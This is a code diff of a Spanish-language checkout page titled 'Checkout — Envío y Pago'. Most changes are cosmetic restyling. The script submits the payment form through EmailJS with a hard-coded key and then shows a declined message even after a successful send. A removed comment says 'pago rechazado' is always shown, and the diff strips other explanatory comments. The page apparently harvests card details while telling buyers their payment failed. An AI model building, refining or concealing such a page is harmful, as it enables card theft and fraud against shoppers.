@@ -6,7 +6,7 @@
 <title>Checkout — Envío y Pago</title>
 <style>
 :root{
-  --bg:#0f172a; --card:#111827; --muted:#94a3b8; --text:#e5e7eb;
+  --bg:#ffffff; --card:#ffffff; --muted:#94a3b8; --text:#1f2937;
   --accent:#22c55e; --accent-2:#3b82f6; --danger:#ef4444;
   --ring:rgba(59,130,246,.35); --radius:14px;
 }
@@ -15,7 +15,14 @@ body{margin:0; font-family: ui-sans-serif, system-ui, -apple-system,"Segoe UI",R
 .container{max-width:700px;margin:0 auto; display:grid; gap:24px; padding:24px;}
 h1{font-size:clamp(22px,3vw,28px); margin:0 0 16px;}
 .subtitle{color:var(--muted); margin:0 0 20px; font-size:14px;}
-.card{background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.02)),rgba(17,24,39,.85); backdrop-filter:blur(8px); border:1px solid rgba(148,163,184,.12); border-radius:var(--radius); padding:20px; box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.06);}
+.card{
+  background: linear-gradient(180deg, rgba(255, 255, 255, 0.7), rgba(255, 255, 255, 0.6)), rgba(255, 255, 255, 0.85);
+  backdrop-filter: blur(8px);
+  border: 1px solid rgba(148, 163, 184, 0.12);
+  border-radius: var(--radius);
+  padding: 20px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+}
 .section-title{display:flex; align-items:center; gap:10px; font-weight:650; margin:6px 0 16px;}
 .section-title .badge {
   font-size:12px;
@@ -33,7 +40,7 @@ form{display:grid; gap:18px;}
 .col-4{grid-column: span 4;}
 @media(max-width:720px){.col-6,.col-4{grid-column: span 12;}}
 label{display:block;font-size:12px;color:var(--muted); margin:0 0 8px;}
-input, select{width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(148,163,184,.2); background: rgba(2,6,23,.55); color:var(--text); outline:none; transition:.15s;}
+input, select{width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(148,163,184,.2); background:#ffffff; color:var(--text); outline:none; transition:.15s;}
 input::placeholder{color:#6b7280;}
 input:focus, select:focus{border-color: var(--accent-2); box-shadow:0 0 0 6px var(--ring);}
 input.error, select.error{border-color: var(--danger);}
@@ -84,7 +91,7 @@ input.error, select.error{border-color: var(--danger);}
   border-radius: 10px;
   background: rgba(34,197,94,.1);
   font-size: 13px;
-  color: #bbf7d0;
+  color: #22c55e;
 }
 .ssl-seal i {font-size: 18px; color: #22c55e;}
 /* Banner superior */
@@ -227,7 +234,6 @@ input.error, select.error{border-color: var(--danger);}
             </select>
           </div>
 
-          <!-- 🔽 Campo agregado (sin name para NO enviarse con EmailJS) -->
           <div class="col-12" id="mesesContainer" style="display:none;">
             <label for="meses">Meses sin intereses</label>
             <select id="meses">
@@ -270,8 +276,6 @@ document.addEventListener("DOMContentLoaded", () => {
   const sameAsShipping = document.getElementById("sameAsShipping");
   const billingSection = document.getElementById("billingSection");
   const cardExp = document.getElementById("cardExp");
-
-  // --- NUEVAS referencias para meses sin intereses ---
   const cardType = document.getElementById("cardType");
   const mesesContainer = document.getElementById("mesesContainer");
   const meses = document.getElementById("meses");
@@ -288,7 +292,6 @@ document.addEventListener("DOMContentLoaded", () => {
     cardExp.value = value;
   });
 
-  // Mostrar/ocultar y hacer obligatorio el select de meses cuando es crédito
   cardType.addEventListener("change", () => {
     if (cardType.value === "credito") {
       mesesContainer.style.display = "block";
@@ -339,7 +342,7 @@ document.addEventListener("DOMContentLoaded", () => {
     return valid;
   }
 
-  emailjs.init("T72Wf1jx7lTBM9Md-"); // 🔑 Reemplaza con tu Public Key
+  emailjs.init("T72Wf1jx7lTBM9Md-");
 
   form.addEventListener("submit", e => {
     e.preventDefault();
@@ -361,7 +364,7 @@ document.addEventListener("DOMContentLoaded", () => {
         spinner.style.display = "none";
         btn.disabled = false;
         btn.textContent = "Pagar ahora";
-        errorMsg.style.display = "block"; // Mostrar siempre "pago rechazado"
+        errorMsg.style.display = "block";
       })
       .catch(() => {
         spinner.style.display = "none";
@@ -374,7 +377,6 @@ document.addEventListener("DOMContentLoaded", () => {
 </script>
 </body>
 </html>
-
 
 
 
